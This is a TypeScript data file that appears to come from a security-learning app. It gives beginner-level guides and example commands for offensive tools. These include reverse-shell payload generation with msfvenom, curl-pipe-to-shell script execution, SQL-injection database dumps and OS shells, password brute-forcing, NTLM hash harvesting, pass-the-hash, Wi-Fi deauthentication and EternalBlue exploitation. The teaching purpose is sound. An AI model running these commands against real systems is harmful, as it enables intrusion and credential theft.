import type { CommandSpec } from "../types";

/**
 * Hand-written plain-English guides for the tools learners meet first.
 * `commands` is the FULL set we show (a superset of the raw command list),
 * each entry explains what the command does and why you would run it.
 */
export interface ToolGuide {
  plainExplain: string;
  commands: CommandSpec[];
}

export const TOOL_GUIDES: Record<string, ToolGuide> = {
  nmap: {
    plainExplain:
      "Nmap is a network radar. Give it an IP address (or a whole range like 192.168.1.0/24) and it tells you which devices are alive, which ports have services listening, and — with the -sV flag — what software and version runs there. It's the first tool you reach for when you want to know what a target actually is.",
    commands: [
      {
        cmd: "nmap -sn 192.168.1.0/24",
        explain:
          "A gentle 'ping sweep' that just lists which hosts are alive on the network. No ports probed, so it's the safest first step for mapping what's there.",
      },
      {
        cmd: "nmap -sS -T4 192.168.1.10",
        explain:
          "The classic SYN scan: fast, popular, and it only takes a half-open TCP connection. -T4 just speeds the timing up. This is the default you'll see in most tutorials.",
      },
      {
        cmd: "nmap -sV -sC target",
        explain:
          "Runs service version detection (-sV) plus a set of safe default scripts (-sC). Instead of 'port 80 open', you learn 'port 80 runs nginx 1.24.0' — the info that actually matters.",
      },
      {
        cmd: "nmap -p- -T4 target",
        explain:
          "Scans all 65,535 TCP ports instead of the default 1,000. Slower, but you catch services hiding on weird high ports — a favourite hiding spot in CTFs.",
      },
      {
        cmd: "nmap --script vuln target",
        explain:
          "Runs the vulnerability-detection scripts built into Nmap. It checks known issues (like Log4Shell or weak certificates) against the target automatically.",
      },
      {
        cmd: "nmap -O --osscan-guess target",
        explain:
          "Tries to guess the target's operating system from subtle packet fingerprints. Useful to know whether you're dealing with Windows, Linux, or a network device.",
      },
      {
        cmd: "nmap -oA scan target",
        explain:
          "Saves results in all three output formats (normal, XML, greppable). Teams and later reports read these files, so always save your scans.",
      },
    ],
  },
  sqlmap: {
    plainExplain:
      "SQLmap checks a website URL for SQL injection and, when it finds a hole, dumps database data. It automates what would otherwise be hours of manual testing — point it at a search box or a parameter like ?id=5 and it does the rest.",
    commands: [
      {
        cmd: "sqlmap -u 'http://target.com/item.php?id=5' --batch",
        explain:
          "Points sqlmap at a parameter (?id=5) and runs non-interactively with --batch (defaults yes to every prompt). The first command to try when you suspect a SQLi.",
      },
      {
        cmd: "sqlmap -u 'http://target.com/item.php?id=5' --dbs",
        explain:
          "Lists every database on the server once injection is confirmed. Tells you how much data the system actually stores.",
      },
      {
        cmd: "sqlmap -u 'http://target.com/item.php?id=5' -D appdb --tables",
        explain:
          "Names the tables inside a chosen database. This is where you spot juicy ones like users, orders, or payments.",
      },
      {
        cmd: "sqlmap -u 'http://target.com/item.php?id=5' -D appdb -T users --dump",
        explain:
          "Dumps the actual rows from the users table, usually including usernames and password hashes. This is the step that proves impact — and why you only ever do this in your own lab.",
      },
      {
        cmd: "sqlmap -u 'http://target.com/item.php?id=5' --os-shell",
        explain:
          "Attempts to turn the database flaw into a real command shell on the server. Extremely high impact; reserved for authorized test work only.",
      },
    ],
  },
  hydra: {
    plainExplain:
      "Hydra guesses usernames and passwords against login services (SSH, FTP, RDP, web forms and more). It's a brute-forcer: it tries combination after combination from a wordlist until one works.",
    commands: [
      {
        cmd: "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10",
        explain:
          "Tries the username 'admin' with every password in rockyou.txt against SSH. One-line, classic attack — loud in logs, so only for labs.",
      },
      {
        cmd: "hydra -L users.txt -P pass.txt ftp://192.168.1.10",
        explain:
          "Tries every combination of names from users.txt and passwords from pass.txt against FTP. The form you use once you have a few candidate usernames.",
      },
      {
        cmd: "hydra -l admin -P pass.txt http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'",
        explain:
          "Attacks a website login page by filling in the exact form fields. The :F=incorrect part tells hydra what a failed attempt looks like.",
      },
      {
        cmd: "hydra -l admin -P pass.txt -t 4 ssh://192.168.1.10 2>/dev/null | tee hydra_results.txt",
        explain:
          "Same SSH brute force, but with 4 parallel tasks (-t 4) to stay polite, quiet stderr, and results saved to a file with tee.",
      },
    ],
  },
  hashcat: {
    plainExplain:
      "Hashcat cracks password hashes using your graphics card. Find a hash (like the MD5 or bcrypt copies of passwords in a database dump) and hashcat throws billions of guesses a second at it.",
    commands: [
      {
        cmd: "hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt",
        explain:
          "-m 0 is the code for MD5, -a 0 means dictionary attack. It tries every word in rockyou.txt against each hash. The most common first command.",
      },
      {
        cmd: "hashcat -m 3200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt",
        explain:
          "Same attack, but -m 3200 targets bcrypt specifically — the hashing scheme used by many modern web apps and databases.",
      },
      {
        cmd: "hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt",
        explain:
          "-m 1000 is Windows' NTLM hash — what you pull out of Windows machines during post-exploitation. Same dictionary attack, different format.",
      },
      {
        cmd: "hashcat -m 0 -a 3 hashes.txt '?u?l?l?l?l?d'",
        explain:
          "A brute-force (mask) attack: a mask attack instead of a wordlist. '?u?l?l?l?l?d' means '1 uppercase letter, 4 lowercase, then a digit' — great for patterns like Winter2024.",
      },
    ],
  },
  john: {
    plainExplain:
      "John the Ripper is hashcat's cousin — a very good password cracker that also eats the special formats you find in unix shadow files and zip/rar archives.",
    commands: [
      {
        cmd: "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",
        explain:
          "Feeds a hash file through rockyou.txt and prints any passwords it cracks. Use when hashes come from a CTF or a DB dump you've legitimately got.",
      },
      {
        cmd: "unshadow passwd shadow > combined.txt && john combined.txt",
        explain:
          "Combines /etc/passwd and /etc/shadow into one file, then cracks it. On a lab box you own, this is how you prove a weak password policy.",
      },
      {
        cmd: "john --show hashes.txt",
        explain:
          "Redisplays the already-cracked passwords from a previous run without cracking again. Use it to glance at results in a nice table.",
      },
      {
        cmd: "zip2john secret.zip | john --stdin",
        explain:
          "Extracts the hash from a password-protected ZIP and piped straight into john to unlock it. The 'open that zip your friend forgot the password to' hack — on files you own.",
      },
    ],
  },
  gobuster: {
    plainExplain:
      "Gobuster brute-forces hidden paths and files on a website by trying names from a wordlist and watching what the server returns. Great for discovering admin panels, backup files, or API endpoints nobody linked to.",
    commands: [
      {
        cmd: "gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
        explain:
          "Directory brute-force: asks the server for each name in the wordlist and shows which ones exist. The bread-and-butter web recon command.",
      },
      {
        cmd: "gobuster dir -u http://target.com -w dirlist.txt -x php,txt,bak",
        explain:
          "Also tries common extensions like file.php, file.txt, and file.bak — the way you find backup config files developers forget to remove.",
      },
      {
        cmd: "gobuster vhost -u http://target.com -w vhosts.txt --append-domain",
        explain:
          "Looks for other virtual hosts served by the same IP ('admin.target.com', 'dev.target.com'...). Different sites can hide on the same server.",
      },
      {
        cmd: "gobuster dir -u http://target.com -w dirlist.txt --status-codes 200,301,302,403",
        explain:
          "Shows only the interesting HTTP responses (200 OK, 30x redirects, 403 forbidden), hiding all the noise in between.",
      },
    ],
  },
  ffuf: {
    plainExplain:
      "FFUF is a furious fuzzer: instead of one tool for dirs and another for vhosts, it fuzzes any part of a request — paths, subdomains, parameters, headers. Very fast, very popular in modern bug bounties.",
    commands: [
      {
        cmd: "ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
        explain:
          "The FUZZ placeholder tells ffuf where to inject each wordlist entry. Results show with status codes so you can spot real pages.",
      },
      {
        cmd: "ffuf -u http://target.com -H 'Host: FUZZ.target.com' -w subdomains.txt",
        explain:
          "Fuzzes the Host header to brute-force hidden subdomains like admin.target.com when the DNS records aren't public.",
      },
      {
        cmd: "ffuf -u http://target.com/api/FUZZ -w params.txt -mc 200",
        explain:
          "Fuzzes an API endpoint path, showing only 200 responses (-mc 200) so you only see endpoints that actually return data.",
      },
      {
        cmd: "ffuf -u 'http://target.com/search?q=FUZZ' -w payloads.txt -fc 404",
        explain:
          "Fuzzes a search parameter with attacker payloads and hides 404s, revealing which inputs the app probably reflects or executes.",
      },
    ],
  },
  nikto: {
    plainExplain:
      "Nikto is an old-school web server scanner: it fires thousands of well-known checks at a site for outdated software, dangerous files, and misconfigurations. Loud but thorough.",
    commands: [
      {
        cmd: "nikto -h http://target.com",
        explain:
          "Runs the standard scan against a host and prints a checklist of findings. Great first pass for a quick win list.",
      },
      {
        cmd: "nikto -h http://target.com -Tuning 3",
        explain:
          "Runs only the information-disclosure checks (tuning code 3) — file leaks, default pages, Apache info paths. Skips the noisy stuff.",
      },
      {
        cmd: "nikto -h https://target.com -ssl -output scan.html",
        explain:
          "Scans an HTTPS site using SSL and writes a tidy HTML report you can hand to a teammate or keep for evidence.",
      },
    ],
  },
  wpscan: {
    plainExplain:
      "WPScan audits WordPress sites: which theme and plugins are running, which ones have known holes, and even weak passwords for the admin account.",
    commands: [
      {
        cmd: "wpscan --url http://target.com",
        explain:
          "Baseline scan: identifies the WordPress version, active plugins and themes so you know the site's attack surface.",
      },
      {
        cmd: "wpscan --url http://target.com --enumerate u",
        explain:
          "Enumerates usernames (admin, editor, author...). Knowing the admin handle is half of a password attack.",
      },
      {
        cmd: "wpscan --url http://target.com --enumerate vp,vt --plugins-detection aggressive",
        explain:
          "Aggressively hunts for vulnerable plugins (vp) and themes (vt) — the #1 way WordPress sites get hacked.",
      },
      {
        cmd: "wpscan --url http://target.com -U admin -P /usr/share/wordlists/rockyou.txt",
        explain:
          "Password attack: tries rockyou.txt against the admin account. In labs this is a legitimate way to demonstrate weak creds.",
      },
    ],
  },
  responder: {
    plainExplain:
      "Responder listens on a network and answers the name-resolution and authentication requests Windows machines make automatically. When a machine 'asks' who an address is, it replies with your machine — and harvests the NTLM hashes users send. Pure local-network attacker magic.",
    commands: [
      {
        cmd: "sudo responder -I eth0",
        explain:
          "Starts poisoning on the eth0 interface: it answers LLMNR/NBT-NS/mDNS name queries and waits for Windows machines to leak hashes.",
      },
      {
        cmd: "sudo responder -I wlan0 -wv",
        explain:
          "Runs on a Wi-Fi interface with verbose output (-v) and WPAD poisoning (-w), the trick that makes browsers on the network send proxies credentials.",
      },
      {
        cmd: "sudo responder -I eth0 -A",
        explain:
          "'Analyze' mode: it only watches responses without answering anything. Use this first to confirm a network is actually a lab network before you poison it.",
      },
      {
        cmd: "sudo responder -I eth0 -F",
        explain:
          "Forces a fresh random challenge-protocol per query, which helps on stubborn clients while keeping your hashes clean for cracking.",
      },
    ],
  },
  crackmapexec: {
    plainExplain:
      "CrackMapExec (CME) is the Swiss-army knife of Windows networks. One command tells you which machines accept which credentials, what shares are readable, and whether you can run commands — across a whole domain in seconds.",
    commands: [
      {
        cmd: "crackmapexec smb 192.168.1.0/24",
        explain:
          "Pings every Windows box on the subnet over SMB and reports the OS version of each. Instant network census.",
      },
      {
        cmd: "crackmapexec smb 192.168.1.0/24 -u admin -p 'Password123!'",
        explain:
          "Tests one username and password against every host and marks PASSED where they work — the fastest way to find reused credentials.",
      },
      {
        cmd: "crackmapexec smb 192.168.1.0/24 -u users.txt -p pass.txt --continue-on-success",
        explain:
          "Combines a username list with a password list and keeps going after successes, mapping out every working credential pair on the network.",
      },
      {
        cmd: "crackmapexec smb 192.168.1.10 -u admin -p pass --shares",
        explain:
          "Lists the SMB shares a valid account can read and what's inside, surfacing leaked config files and sensitive folders.",
      },
      {
        cmd: "crackmapexec smb 192.168.1.10 -u admin -p pass -x 'whoami'",
        explain:
          "Runs a command on the target through the authentication — proof-of-control, the equivalent of 'I'm in and can operate'.",
      },
    ],
  },
  "evil-winrm": {
    plainExplain:
      "Evil-WinRM gives you a remote command shell on Windows machines using WinRM — what admins use for remote management, abused in pentests when you have valid credentials.",
    commands: [
      {
        cmd: "evil-winrm -i 192.168.1.10 -u admin -p 'Password123!'",
        explain:
          "Logs into the target over WinRM with a username and password and drops you into a PowerShell shell.",
      },
      {
        cmd: "evil-winrm -i 192.168.1.10 -u admin -H <NTLM_HASH>",
        explain:
          "Uses a password hash instead of a password — pass-the-hash. Windows will happily accept it for authentication.",
      },
      {
        cmd: "evil-winrm -i 192.168.1.10 -u admin -p pass -s /opt/scripts -e /tmp",
        explain:
          "Loads a scripts folder and an upload folder so you can drop tools onto the machine and run them from the shell.",
      },
      {
        cmd: "evil-winrm -i 192.168.1.10 -u admin -p pass -X 'whoami /all'",
        explain:
          "Runs a single command non-interactively, ideal for scripting checks like whether your account has admin privileges.",
      },
    ],
  },
  linpeas: {
    plainExplain:
      "LinPEAS is 'Linux Privilege Escalation Awesome Script': run it on a Linux box you have a foothold on, and it prints every misconfiguration that might let you become root — from crazy SUID binaries to readable SSH keys.",
    commands: [
      {
        cmd: "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
        explain:
          "Downloads and runs LinPEAS directly on the target (with a live connection). Watch the colour-coded output — red and yellow lines are leads.",
      },
      {
        cmd: "./linpeas.sh -a",
        explain:
          "Runs an extended sweep including more checks and waits a bit for network enumeration. More thorough, slower.",
      },
      {
        cmd: "./linpeas.sh | tee linpeas.txt",
        explain:
          "Saves the whole report to a file as it prints, so you can grep for 'interesting' lines and keep evidence for your report.",
      },
      {
        cmd: "scp linpeas.sh user@target:/tmp && ssh user@target '/tmp/linpeas.sh'",
        explain:
          "Uploads the script and runs it over SSH — the clean way to use it on targets without internet access.",
      },
    ],
  },
  msfvenom: {
    plainExplain:
      "Msfvenom bakes payloads. It takes a 'what should the shell do when it runs?' (reverse shell, meterpreter...) plus a target format (exe, elf, php...) and outputs a ready-to-deliver malicious file for your lab targets.",
    commands: [
      {
        cmd: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf -o shell.elf",
        explain:
          "Builds a Linux ELF that phones home with a reverse shell to your IP. -f elf is the file format, -o names the output.",
      },
      {
        cmd: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o shell.exe",
        explain:
          "A Windows meterpreter payload — a feature-rich agent that gives you file browsing, screenshots and more once your handler catches it.",
      },
      {
        cmd: "msfvenom -p windows/x64/powershell_reverse_tcp LHOST=IP LPORT=4444 -f ps1 -o rev.ps1",
        explain:
          "A PowerShell one-liner payload for delivery when the target only allows .ps1 scripts — common in phishing labs.",
      },
      {
        cmd: "msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php",
        explain:
          "A PHP payload perfect for uploading through a vulnerable web app — the classic webshell->shell path in CTFs.",
      },
    ],
  },
  msfconsole: {
    plainExplain:
      "Metasploit is the big red toolbox: a console full of ready-made exploits, payloads and post-exploitation modules. You pick a module, set the target, press run — it handles the weapon while you handle the plan.",
    commands: [
      {
        cmd: "msfconsole",
        explain:
          "Starts the Metasploit console — your command center. From here you search, load and run modules.",
      },
      {
        cmd: "search ms17-010",
        explain:
          "Searches the module database by vulnerability name (here: EternalBlue). Learn 5 search terms and you can exploit half the OWASP labs.",
      },
      {
        cmd: "use exploit/windows/smb/ms17_010_eternalblue",
        explain:
          "Loads the EternalBlue SMB exploit module and shows its options, ready to be pointed at a target.",
      },
      {
        cmd: "set RHOSTS 192.168.1.10 && set LHOST 192.168.1.50 && run",
        explain:
          "Points the exploit at the victim (RHOSTS), tells it where to send the reverse shell (LHOST), and runs it.",
      },
      {
        cmd: "sessions -i 1",
        explain:
          "Jumps into the interactive session (shell) you just caught. This is the 'control achieved' moment.",
      },
      {
        cmd: "use post/multi/recon/local_exploit_suggester",
        explain:
          "Loads a helper that examines your foothold and recommends local privilege-escalation exploits you could try next.",
      },
    ],
  },
  subfinder: {
    plainExplain:
      "Subfinder collects all the subdomains it can find about a domain using public sources — certificate logs, search engines, APIs. It never touches the target server, it just digs through records other people already made.",
    commands: [
      {
        cmd: "subfinder -d target.com",
        explain:
          "Passive subdomain discovery from dozens of sources. Results are safe and quiet — no traffic hits the target.",
      },
      {
        cmd: "subfinder -d target.com -silent",
        explain:
          "Prints just the subdomain names, one per line — perfect for piping into httpx or a port scanner for the next stage.",
      },
      {
        cmd: "subfinder -dL domains.txt -all -o results.txt",
        explain:
          "Runs against a whole file of domains using every source (-all) and saves the results — batch recon for an engagement.",
      },
    ],
  },
  enum4linux: {
    plainExplain:
      "Enum4linux interrogates Windows / Samba machines over SMB and RPC to enumerate users, shares, groups and password policies. Half an Active Directory environment leaks its usernames this way with no login at all.",
    commands: [
      {
        cmd: "enum4linux -a 192.168.1.10",
        explain:
          "Runs the comprehensive suite: users, shares, groups, password policy, everything it can pull anonymously.",
      },
      {
        cmd: "enum4linux -U 192.168.1.10",
        explain:
          "Only lists user accounts. Usernames are gold — every password attack needs a candidate list.",
      },
      {
        cmd: "enum4linux -S 192.168.1.10",
        explain:
          "Only lists SMB shares. Unprotected shares are where interns leave spreadsheets full of credentials.",
      },
    ],
  },
  searchsploit: {
    plainExplain:
      "SearchSploit is the offline search for Exploit-DB — turn any software name and version into 'does a working exploit already exist?'. Every pentester starts here before writing anything custom.",
    commands: [
      {
        cmd: "searchsploit apache 2.4",
        explain:
          "Searches the whole exploit database for Apache 2.4 related exploits and papers — fast, fully offline.",
      },
      {
        cmd: "searchsploit -m 49798",
        explain:
          "Copies a specific exploit's code (by its Exploit-DB ID) into your current folder so you can read and run it.",
      },
      {
        cmd: "searchsploit -t linux kernel",
        explain:
          "Searches by title only for Linux kernel exploits — the go-to move when you just found a kernel version during privesc.",
      },
    ],
  },
  tcpdump: {
    plainExplain:
      "Tcpdump captures the actual packets crossing a network interface and dumps them to screen or file. It's the command-line microscope for 'what is really being sent' — no GUI needed.",
    commands: [
      {
        cmd: "sudo tcpdump -i eth0",
        explain:
          "Starts capturing everything on eth0. You'll see a firehose — best combined with a filter.",
      },
      {
        cmd: "sudo tcpdump -i any port 80 -n",
        explain:
          "Only shows port 80 (HTTP) traffic, no DNS lookups (-n keeps it fast and clean). Good first filter to learn.",
      },
      {
        cmd: "sudo tcpdump -i any -w capture.pcap",
        explain:
          "Writes raw packets to a file instead of the screen. Save first, analyze later in Wireshark or tshark.",
      },
      {
        cmd: "sudo tcpdump -r capture.pcap 'tcp dst port 443'",
        explain:
          "Re-reads a saved capture and filters it — here, TLS traffic to port 443 — without needing the network again.",
      },
    ],
  },
  "aircrack-ng": {
    plainExplain:
      "The aircrack-ng suite is the Wi-Fi testing toolbox: capture handshakes from encrypted networks, analyze them, and crack the password. You'll run several commands in sequence rather than one magic line.",
    commands: [
      {
        cmd: "sudo airmon-ng start wlan0",
        explain:
          "Puts your Wi-Fi card into monitor mode — it can now see every packet in the air, not just your network's. Always your first step.",
      },
      {
        cmd: "sudo airodump-ng wlan0mon",
        explain:
          "Scans all nearby access points and clients, showing BSSIDs, channels, and encryption types. You pick your target from this list.",
      },
      {
        cmd: "sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon",
        explain:
          "Locks onto one access point on its channel and records everything to 'capture' files — this is how you bag the WPA handshake.",
      },
      {
        cmd: "sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon",
        explain:
          "Sends deauthentication packets to bump clients off so they reconnect — and the reconnect is what produces the handshake you need. Lab-only.",
      },
      {
        cmd: "aircrack-ng -b AA:BB:CC:DD:EE:FF -w /usr/share/wordlists/rockyou.txt capture-01.cap",
        explain:
          "Feeds the captured handshake + rockyou.txt into aircrack-ng. Weak network passwords fall in seconds to minutes.",
      },
    ],
  },
  theharvester: {
    plainExplain:
      "theHarvester gathers open-source intel about a company or person: emails, employee names, subdomains and IPs, by searching Google, Bing, LinkedIn and other public indexes. All passive — you never touch the target's servers.",
    commands: [
      {
        cmd: "theHarvester -d target.com -b all",
        explain:
          "Searches every supported source for data tied to target.com and prints emails, names and subdomains in a tidy table.",
      },
      {
        cmd: "theHarvester -d target.com -b linkedin -l 200",
        explain:
          "Focuses on LinkedIn to collect up to 200 employee names — the raw material for username guessing later.",
      },
    ],
  },
  dnsrecon: {
    plainExplain:
      "DNSRecon is the DNS information vacuum: it checks a domain's records, attempts zone transfers, and brute-forces subdomains — everything the public DNS system will tell you, in one pass.",
    commands: [
      {
        cmd: "dnsrecon -d target.com",
        explain:
          "Standard enumeration: NS/MX/SOA records, common subdomains, and a quiant check whether zone transfer is possible.",
      },
      {
        cmd: "dnsrecon -d target.com -t brt -D /usr/share/wordlists/dirb/common.txt",
        explain:
          "Brute-forces subdomains against a wordlist, catching hosts that never got linked anywhere.",
      },
      {
        cmd: "dnsrecon -d target.com -t axfr",
        explain:
          "Tries a full zone transfer — the admin shortcut that hands you every record at once. Usually blocked today, but when open it's an instant prize.",
      },
    ],
  },
};

/**
 * Hand-written plain-English blurbs for popular tools without full command guides.
 * Anything not listed here gets an auto-generated explanation.
 */
export const PLAIN_EXPLAIN_OVERRIDES: Record<string, string> = {
  burpsuite:
    "Burp Suite is the gateway tool for web hacking. It sits between your browser and the internet and lets you inspect, modify and replay every request the site sends. Think of it as a wiretap plus a scalpel for HTTP.",
  "burpsuite-community":
    "The free edition of Burp Suite. You get the intercepting proxy and manual tools to tweak requests — everything a learner needs to start understanding how web apps really talk.",
  wireshark:
    "Wireshark opens the hood on your network: every packet is decoded into readable protocol information with a friendly GUI. When tcpdump gives you raw noise, Wireshark turns it into a story.",
  beef:
    "BeEF turns a browser into a puppet. It 'hooks' a browser with a tiny piece of JavaScript (delivered via XSS or phishing) and then lets you issue commands to that browser remotely — mostly for demonstrating what drive-by JavaScript can do.",
  bloodhound:
    "BloodHound maps an Active Directory domain as a graph so you can see hidden attack paths — 'who can reach who, and from where'. The shortest route to Domain Admin is usually invisible in ASCII output but obvious on BloodHound's graph.",
  bettercap:
    "Bettercap is the modern man-in-the-middle tool: ARP spoofing, sniffing, credential capture and more, with a clean interactive console. It's like the old-school tools, rebuilt for newer networks.",
  mitm6:
    "mitm6 takes over IPv6 DNS on a Windows network when no IPv6 DHCP server exists. Windows machines ask it for configuration, and it wins them over, then steers them to your fake services to harvest credentials.",
  chisel:
    "Chisel tunnels traffic over a single TCP connection — used to 'pivot' when you can only reach a server through one port. It can tunnel plain TCP, UDP, and even open a SOCKS proxy from deep inside the network.",
  proxychains:
    "Proxychains makes any command-line tool talk through a proxy chain. Combine it with ssh tunnels and you can route your scans through compromised machines, hiding your real IP.",
  hackrf:
    "HackRF is a cheap software-defined radio that can transmit at nearly any frequency. Ethical hackers use it to replay car remotes, test RFID/NFC readers, or study RF signals — legally, on gear you own.",
  gnuradio:
    "GNU Radio is a visual flow language for software-defined radio. You connect blocks — sources, filters, demodulators — to build your own radio receiver entirely in software.",
  volatility3:
    "Volatility reads RAM dumps. Given a memory image of a machine, it lists processes, networks, injected code and credentials living only in memory — the forensic answer to 'what was running on that box?'.",
  "rtl-sdr":
    "A $20 USB TV tuner (RTL-SDR) turned into a general-purpose radio receiver. You plug it in and listen to everything from aircraft transponders to weather satellites and pager traffic.",
  masscan:
    "Masscan scans ports at internet scale by skipping normal TCP handshakes — asynchronous speed across whole IP ranges where nmap would take days.",
  sherlock:
    "Sherlock takes a username and checks 300+ social networks to see where that handle exists online — the starting move for connecting an alias to a real person.",
  amass:
    "Amass maps an organization's entire attack surface — subdomains, assets and relationships pulled from dozens of APIs — and draws the picture external reconnaissance is supposed to find.",
  "recon-ng":
    "Recon-ng is a console-style framework that packs hundreds of OSINT modules into one interface: you install a module, set the target, run it, and stash results in a database.",
  maltego:
    "Maltego turns OSINT into graphs: it links domains, emails, people and infrastructure so you can literally see how things connect — the presentation layer of public-source intel.",
  spiderfoot:
    "SpiderFoot automates 200+ OSINT techniques in one scan and produces a correlation report that joins up emails, subdomains, leaked passwords and infrastructure findings.",
  shodan:
    "Shodan is Google for internet-connected devices. Search banners, port data and exploitable services that are exposed worldwide — great for understanding what the internet exposes.",
  nuclei:
    "Nuclei runs thousands of community security templates against a target in minutes — a YAML-powered vulnerability scanner that checks for old CVEs, misconfigs and exposed files.",
  wafw00f:
    "WAFW00F detects whether a site sits behind a Web Application Firewall and which one — critical before you start web attacks that WAFs will block or alert on.",
  rustscan:
    "RustScan scans every TCP port on a host in seconds using parallelism, then hands the open ports to nmap for the detailed passes. Speed layer for nmap.",
  httpx:
    "httpx harvests details about a list of URLs or hosts — status codes, titles, redirects, technologies — so you can triage hundreds of candidates in seconds.",
  kerbrute:
    "Kerbrute hammers Kerberos with wordlists to enumerate valid usernames and even spray passwords — without setting off the same tripwires as network logins.",
  "bloodhound-python":
    "BloodHound-Python pulls Active Directory structure into the BloodHound graph when you only have credentials, not a Windows machine — the Linux-side collector.",
  empire:
    "Empire is a post-exploitation agent framework with modules for persistence, lateral movement and exfiltration — a PowerShell/c-agent alternative to Cobalt Strike for labs.",
  covenant:
    "Covenant is an open-source .NET command-and-control framework for post-exploitation with a web UI, useful for learning what C2 agents actually do.",
  ysoserial:
    "ysoserial generates Java deserialization payloads that can get you code execution on thousands of Java apps — the one gadget every web pentester keeps around.",
  gdb:
    "GDB lets you pause a program at any instruction, inspect memory and registers, and rewind the flow — the teaching microscope for buffer overflows and binary exploitation.",
  radare2:
    "Radare2 is a terminal-based reverse engineering environment for disassembling and patching binaries — the keyboard-first alternative to Ghidra for the CLI crowd.",
  xsser:
    "XSSer helps automate XSS detection and exploitation against a target parameter, useful to demonstrate stored/reflected/DOM XSS in your own web apps.",
  webshells:
    "Small PHP/ASP files that execute commands through a web server. Embedded via a file-upload or RCE bug, a webshell becomes your persistent foothold on the box.",
  zap:
    "OWASP ZAP is Burp's friendly open sibling: an intercepting proxy and automated scanner that beginners can set up in minutes to find common web flaws.",
  fierce:
    "Fierce hunts subdomains and non-contiguous IP ranges for a domain, originally written to trace DNS entries that jump between different network blocks.",
  dmitry:
    "DMitry gathers whois, subdomains, open ports and email contacts in one swipe — a quick-and-dirty reconnaissance grab bag from the early days.",
};